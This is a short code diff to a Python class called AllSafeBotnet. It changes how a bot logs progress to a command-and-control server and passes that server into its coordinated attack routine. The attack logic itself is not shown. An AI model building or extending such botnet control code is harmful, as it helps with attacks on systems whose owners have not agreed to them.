@@ -78,10 +78,10 @@ class AllSafeBotnet():
                 self.attack(configuration, override=True, ccserver=server)
             # periodically check for C&C to carry a coordinated attack
             else:
-                up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + str(self._attack_counter) + "executing")
+                up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + str(self._attack_counter) + " trying protocol")
                 if up:
                     try:
-                        id, resources, counter = self.attack(configuration, override=False)
+                        id, resources, counter = self.attack(configuration, override=False, ccserver=server)
                         logCCUpdate(server, id, "attack n. " + str(counter) + " (failed " + str(self._attempt_counter) + " times)" + "\n" + str(json.dumps(resources, indent=4)))
                         self._attempt_counter = 0
                     except Exception:
